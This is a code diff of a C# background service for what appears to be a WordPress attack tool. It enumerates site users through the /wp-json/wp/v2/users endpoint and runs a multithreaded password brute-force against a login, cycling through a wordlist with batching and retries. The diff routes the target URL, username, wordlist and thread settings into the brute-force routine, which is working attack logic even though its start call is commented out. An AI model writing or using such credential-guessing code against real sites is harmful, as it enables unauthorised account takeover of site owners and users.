@@ -4,7 +4,6 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net.Http;
-using System.Reflection;
 using System.Threading;
 using System.Threading.Tasks;
 using Newtonsoft.Json;
@@ -30,42 +29,53 @@ namespace react_background_service
                 {
                     var action = JsonConvert.DeserializeObject<Task>(command);
 
-                    if (action.MessageAction == Task.Action.Add)
+                    if (action.MessageAction == Action.Add)
                     {
-                        var id = 0;
+                        var id = 1;
                         if (ProcessList.Count > 0)
                         {
-                            id = ProcessList.Select(item => item.Id).Prepend(id).Max();
+                            id = ProcessList.Max(x => x.Id) + 1;
                         }
-                        
+
                         ProcessList.Add(new Task()
                         {
-                            Id = id + 1,
+                            Id = id,
                             Name = action.Name,
                             Percentage = 0,
                             Url = action.Url,
-                            TaskStatus = Task.Status.Starting,
+                            TaskStatus = Status.Starting,
                             TaskType = action.TaskType,
-                            MessageAction = Task.Action.Ping,
+                            MessageAction = Action.Ping,
+                            Username = action.Username,
+                            Wordlist = action.Wordlist,
                             TaskResult = new Result()
                             {
                                 UserEnumeration = new List<UserObj>(), 
                                 BruteForce = new LoginCredentials()
+                            },
+                            Options = new Options()
+                            {
+                                BruteForceOptions = new BruteForceOptions()
+                                {
+                                    BatchCount = action.Options.BruteForceOptions.BatchCount,
+                                    MaxThreads = action.Options.BruteForceOptions.MaxThreads,
+                                    RetryCount = action.Options.BruteForceOptions.RetryCount,
+                                }
                             }
                         });
 
                         SendStatus();
 
                         // USER ENUMERATION
-                        if (action.TaskType == Task.Type.Enumeration)
+                        if (action.TaskType == Type.Enumeration)
                         {
                             var enumTask = new System.Threading.Tasks.Task(async () =>
                             {
                                 // ToDo: [enumTask Task Cancellation]
-                                var index = ProcessList.FindIndex(a => a.Id == id + 1);
+                                var index = ProcessList.FindIndex(a => a.Id == id);
                                 var process = ProcessList[index];
 
-                                ProcessList[index].TaskStatus = Task.Status.Running;
+                                ProcessList[index].TaskStatus = Status.Running;
 
                                 var client = new HttpClient();
                                 var response = await client.GetAsync(process.Url + "/wp-json/wp/v2/users");
@@ -77,103 +87,99 @@ namespace react_background_service
                                 ProcessList[index].TaskResult.UserEnumeration = list;
 
                                 // update task status
-                                ProcessList[index].TaskStatus = Task.Status.Ready;
+                                ProcessList[index].TaskStatus = Status.Ready;
                                 ProcessList[index].Percentage = 100;
 
                                 SendStatus();
                             });
                             enumTask.Start();
                         }
-                    }
-                    
-                    // BRUTE FORCE ATTACK
-                    if (action.TaskType == Task.Type.BruteForce)
-                    {
-                        var bruteTask = new System.Threading.Tasks.Task(() =>
+
+                        // BRUTE FORCE ATTACK
+                        if (action.TaskType == Type.BruteForce)
                         {
-                            // ToDo: [bruteTask Task Cancellation]
-                            var uri = "";
-                            var username = "";
-                            var wordListPath = "";
-                            var maxThreads = 0;
-                            var batchCount = 0;
-                            var retryCount = 0;
-                            var outFilePath = "";
-                            var found = false;
-                            var watch = Stopwatch.StartNew();
-
-                            var la = new LoginAttempt(new Uri(uri));
-                            using var sr = new StreamReader(wordListPath);
-
-                            void update(decimal percentage, long seconds)
+                            var bruteTask = new System.Threading.Tasks.Task(() =>
                             {
-                                var remaining = TimeSpan.FromSeconds(seconds);
-                                var progress = $"{percentage * 100:0.0000}";
-                            }
+                                // ToDo: [bruteTask Task Cancellation]
 
-                            while (!sr.EndOfStream)
-                            {
-                                var buffer = new List<string>();
-                                for (var i = 0; i < batchCount; i++)
+                                var index = ProcessList.FindIndex(a => a.Id == id);
+                                var process = ProcessList[index];
+
+                                ProcessList[index].TaskStatus = Status.Running;
+
+                                var uri = process.Url;
+                                var username = process.Username;
+                                var wordListPath = process.Wordlist;
+                                var maxThreads = process.Options.BruteForceOptions.MaxThreads;
+                                var batchCount = process.Options.BruteForceOptions.BatchCount;
+                                var retryCount = process.Options.BruteForceOptions.RetryCount;
+                                var found = false;
+                                var watch = Stopwatch.StartNew();
+
+                                var la = new LoginAttempt(new Uri(uri));
+                                using var sr = new StreamReader(wordListPath);
+
+                                void update(decimal percentage, long seconds)
                                 {
-                                    buffer.Add(sr.ReadLine());
+                                    var remaining = TimeSpan.FromSeconds(seconds);
+                                    var progress = $"{percentage * 100:0.0000}";
                                 }
 
-                                var percentage = (decimal)sr.BaseStream.Position / sr.BaseStream.Length;
-                                var percentsPerSecond = percentage / (decimal)watch.Elapsed.TotalSeconds;
-                                var remainingSeconds = (long)((1 - percentage) / percentsPerSecond);
-                                update(percentage, remainingSeconds);
+                                while (!sr.EndOfStream)
+                                {
+                                    var buffer = new List<string>();
+                                    for (var i = 0; i < batchCount; i++)
+                                    {
+                                        buffer.Add(sr.ReadLine());
+                                    }
 
-                                Parallel.ForEach(buffer, new ParallelOptions { MaxDegreeOfParallelism = maxThreads },
-                                    password =>
+                                    var percentage = (decimal)sr.BaseStream.Position / sr.BaseStream.Length;
+                                    var percentsPerSecond = percentage / (decimal)watch.Elapsed.TotalSeconds;
+                                    var remainingSeconds = (long)((1 - percentage) / percentsPerSecond);
+                                    update(percentage, remainingSeconds);
+
+                                    Parallel.ForEach(buffer, new ParallelOptions { MaxDegreeOfParallelism = maxThreads }, password =>
                                     {
                                         var currentRetry = 0;
-
                                         for (; ; ) // retry pattern
                                         {
                                             try
                                             {
                                                 if (!la.LoginAttemptAsync(username, password).GetAwaiter().GetResult()) return;
-
                                                 // password found!
                                                 found = true;
-
                                                 break;
                                             }
-                                            // in case the login attempt fails.
                                             // ToDo: [Brute Force Exception handler] Keep trying if the exception may be temporary. Stop trying if not.
                                             catch
                                             {
                                                 currentRetry++;
 
-                                                if (currentRetry > retryCount)
-                                                {
-                                                    break; // not work, stop trying
-                                                }
-
+                                                if (currentRetry > retryCount) break; // not work, stop trying
                                                 Thread.Sleep(1000 * currentRetry);
                                             }
                                         }
                                     });
 
+                                    if (found) return;
+                                }
+
                                 if (found) return;
-                            }
 
-                            if (found) return;
+                                // Password not found!
 
-                            // Password not found!
-
-                        });
-                        //bruteTask.Start();
+                            });
+                            //bruteTask.Start();
+                        }
                     }
 
-                    if (action.MessageAction == Task.Action.Remove)
+                    if (action.MessageAction == Action.Remove)
                     {
                         var item = ProcessList.SingleOrDefault(x => x.Id == action.Id);
                         if (item != null) ProcessList.Remove(item);
                     }
 
-                    if (action.MessageAction == Task.Action.Ping)
+                    if (action.MessageAction == Action.Ping)
                     {
                         SendStatus();
                     }
